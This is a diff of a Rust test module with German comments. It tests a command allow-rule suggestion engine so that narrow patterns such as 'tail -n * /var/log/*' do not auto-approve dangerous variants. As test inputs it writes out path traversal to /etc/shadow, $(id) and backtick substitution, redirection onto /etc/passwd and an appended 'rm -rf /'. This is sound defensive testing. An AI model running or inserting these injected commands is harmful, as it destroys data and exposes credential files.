-            "darf keinen 'env *'-Catch-all vorschlagen, bekam: {result:?}"
-        );
-        assert!(result.iter().any(|(_, pattern)| pattern == "rm *"));
+    mod props {
+        use super::*;
+        use proptest::prelude::*;
+
+        fn word() -> impl Strategy<Value = String> {
+            prop_oneof![
+                "[a-z]{1,6}",
+                Just("-C".to_string()),
+                Just("/srv/app".to_string()),
+                Just("--user".to_string()),
+                Just("-n".to_string()),
+                Just("sudo".to_string()),
+                Just("env".to_string()),
+                Just("$(id)".to_string()),
+                Just("a*b".to_string()),
+                Just("\"q x\"".to_string()),
+            ]
+        }
+
+        fn segment() -> impl Strategy<Value = String> {
+            prop_oneof![
+                Just("git".to_string()),
+                Just("docker".to_string()),
+                Just("kubectl".to_string()),
+                Just("systemctl".to_string()),
+                Just("sudo".to_string()),
+                "[a-z]{1,6}",
+            ]
+            .prop_flat_map(|head| {
+                proptest::collection::vec(word(), 0..4)
+                    .prop_map(move |w| format!("{head} {}", w.join(" ")).trim().to_string())
+            })
+        }
+
+        proptest! {
+            #![proptest_config(ProptestConfig::with_cases(48))]
+
+            /// Jeder Vorschlag macht das bestätigte Kommando zu AutoExec,
+            /// außer eine regelunabhängige Prüfung greift: Dann reicht es,
+            /// dass die Engine ohne Regeln dasselbe nicht erlaubt.
+            #[test]
+            fn every_suggestion_auto_accepts_the_confirmed_command(
+                segs in proptest::collection::vec(segment(), 1..4),
+                sep in prop_oneof![Just(" | "), Just(" && "), Just("; ")],
+            ) {
+                let command = segs.join(sep);
+                let rt = tokio::runtime::Builder::new_current_thread().enable_all().build().unwrap();
+                rt.block_on(async {
+                    let (_d, empty) = new_store().await;
+                    let baseline = FilterEngine::new(empty).evaluate(&command, &ctx()).await;
+                    let suggestions = suggest_rule_patterns(&command);
+                    prop_assert!(suggestions.len() <= MAX_SUGGESTIONS);
+                    for s in suggestions {
+                        let d = decision_with(&s, &command).await;
+                        if matches!(d, Decision::AutoExec) {
+                            continue;
+                        }
+                        // Nur eine regelunabhängige Prüfung darf verhindern.
+                        let (_d, store) = new_store().await;
+                        create_quick_rules(&store, vec![SuggestionPatternDto{pattern_type: PatternType::Glob, pattern_value: "*".into()}], Scope::Global, None).await.unwrap();
+                        let with_catch_all = FilterEngine::new(store).evaluate(&command, &ctx()).await;
+                        prop_assert!(
+                            !matches!(with_catch_all, Decision::AutoExec),
+                            "{command:?} / {s:?}: {d:?} (ohne Regeln {baseline:?})"
+                        );
+                    }
+                    Ok(())
+                })?;
+            }
+        }
     }
 
     #[tokio::test]
@@ -335,5 +911,156 @@ mod tests {
         assert_eq!(stored.action, RuleAction::Allow);
         assert_eq!(stored.priority, 0);
         assert_eq!(stored.scope, Scope::Global);
+    }
+    // --- #588: pfad-begrenzt und letztes Argument offen -------------------
+
+    async fn auto(s: &PatternSuggestionDto, cmd: &str) -> bool {
+        decision_with(s, cmd).await == Decision::AutoExec
+    }
+
+    #[tokio::test]
+    async fn test_path_scoped_tail_matches_siblings_only() {
+        let s = by_kind("tail -n 100 /var/log/syslog", SuggestionKind::PathScoped);
+        assert_eq!(values(&s), ["tail -n * /var/log/*"]);
+        assert!(auto(&s, "tail -n 100 /var/log/syslog").await);
+        assert!(auto(&s, "tail -n 50 /var/log/auth.log").await);
+        assert!(!auto(&s, "tail -n 50 /var/log/nginx/access.log").await);
+        assert!(!auto(&s, "tail -n 50 /etc/shadow").await);
+        assert!(!auto(&s, "tail -n 50 /var/log/../../etc/shadow").await);
+        assert!(!auto(&s, "tail -n 50 /var/log/..").await);
+    }
+
+    #[tokio::test]
+    async fn test_path_scoped_ls_lists_directory_too() {
+        let s = by_kind("ls -la /etc/nginx", SuggestionKind::PathScoped);
+        assert_eq!(values(&s), ["ls -la /etc/*", "ls -la /etc/nginx/*"]);
+        assert!(auto(&s, "ls -la /etc/nginx").await);
+        assert!(auto(&s, "ls -la /etc/nginx/nginx.conf").await);
+        // Traversal wird normalisiert: nur was wirklich im Elternverzeichnis
+        // liegt, trifft; ein Ausbruch daraus nicht.
+        assert!(!auto(&s, "ls -la /etc/nginx/../../root").await);
+        assert!(!auto(&s, "ls -la /etc/nginx/../../etc/nginx/../../root").await);
+        assert!(!auto(&s, "ls -la /etc/$(id)").await);
+        assert!(!auto(&s, "ls -la /etc/`id`").await);
+        assert!(!auto(&s, "ls -la /etc/nginx/sites/x").await);
+    }
+
+    #[test]
+    fn test_path_scoped_skipped_for_root_parent_and_unsafe_paths() {
+        for cmd in [
+            "cat /etc",
+            "cat /etc/",
+            "cat /etc/../x",
+            "cat /etc/./x",
+            "cat /etc//x",
+            "cat /a/b /c/d",
+            "cat --file=/a/b",
+            "cat /etc/$(id)",
+            "cat 'a b'/x",
+            "curl http://host/x",
+        ] {
+            assert!(
+                !suggest_rule_patterns(cmd)
+                    .iter()
+                    .any(|s| s.kind == SuggestionKind::PathScoped),
+                "{cmd}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn test_last_arg_open_systemctl_and_docker() {
+        let s = by_kind("systemctl restart nginx", SuggestionKind::LastArgOpen);
+        assert_eq!(values(&s), ["systemctl restart *"]);
+        assert!(auto(&s, "systemctl restart apache2").await);
+        assert!(!auto(&s, "systemctl stop nginx").await);
+        let s = by_kind("docker logs -f web", SuggestionKind::LastArgOpen);
+        assert_eq!(values(&s), ["docker logs -f *"]);
+        assert!(auto(&s, "docker logs -f db").await);
+        assert!(!auto(&s, "docker rm -f web").await);
+    }
+
+    #[test]
+    fn test_last_arg_open_skipped_for_paths_options_and_short_commands() {
+        for cmd in [
+            "cat /var/log/x",
+            "ls foo",
+            "ls -la",
+            "ls",
+            "tail -n 100 /a/b",
+        ] {
+            assert!(
+                !suggest_rule_patterns(cmd)
+                    .iter()
+                    .any(|s| s.kind == SuggestionKind::LastArgOpen),
+                "{cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_new_suggestions_sit_between_exact_and_tool() {
+        let kinds: Vec<_> = suggest_rule_patterns("systemctl restart nginx")
+            .iter()
+            .map(|s| s.kind)
+            .collect();
+        assert_eq!(
+            kinds,
+            [
+                SuggestionKind::Exact,
+                SuggestionKind::LastArgOpen,
+                SuggestionKind::Subcommand,
+                SuggestionKind::Tool
+            ]
+        );
+    }
+
+    #[tokio::test]
+    async fn test_path_scoped_per_segment_in_pipeline() {
+        let command = "cat /var/log/syslog | grep error";
+        let s = by_kind(command, SuggestionKind::PathScoped);
+        assert_eq!(values(&s), ["cat /var/log/*", "grep error"]);
+        assert!(auto(&s, command).await);
+    }
+
+    /// Property: jeder neue Vorschlag lässt das bestätigte Kommando
+    /// automatisch zu, trifft nie ein anderes Programm/Unterkommando und
+    /// lässt Umleitung/Substitution/Wrapper/kodierte Pfade nicht durch.
+    #[tokio::test]
+    async fn test_new_suggestions_property_and_adversarial() {
+        let commands = [
+            "tail -n 100 /var/log/syslog",
+            "ls -la /etc/nginx",
+            "systemctl restart nginx",
+            "docker logs -f web",
+            "cat /var/log/syslog | grep error",
+            "journalctl -u nginx -n 50",
+        ];
+        for cmd in commands {
+            for s in suggest_rule_patterns(cmd).into_iter().filter(|s| {
+                matches!(
+                    s.kind,
+                    SuggestionKind::PathScoped | SuggestionKind::LastArgOpen
+                )
+            }) {
+                assert!(auto(&s, cmd).await, "{cmd} / {:?}", values(&s));
+                let tool = cmd.split_whitespace().next().unwrap();
+                let other = format!("other{tool} x");
+                assert!(!auto(&s, &other).await);
+                for evil in [
+                    format!("{cmd} > /etc/passwd"),
+                    format!("{cmd} $(id)"),
+                    format!("{cmd} `id`"),
+                    format!("env X=1 {cmd}"),
+                    format!("{cmd}; rm -rf /"),
+                ] {
+                    assert!(!auto(&s, &evil).await, "{evil} via {:?}", values(&s));
+                }
+                if s.kind == SuggestionKind::PathScoped {
+                    let evil = format!("{cmd}/%2e%2e/x");
+                    assert!(!auto(&s, &evil).await, "{evil}");
+                }
+            }
+        }
     }
 }
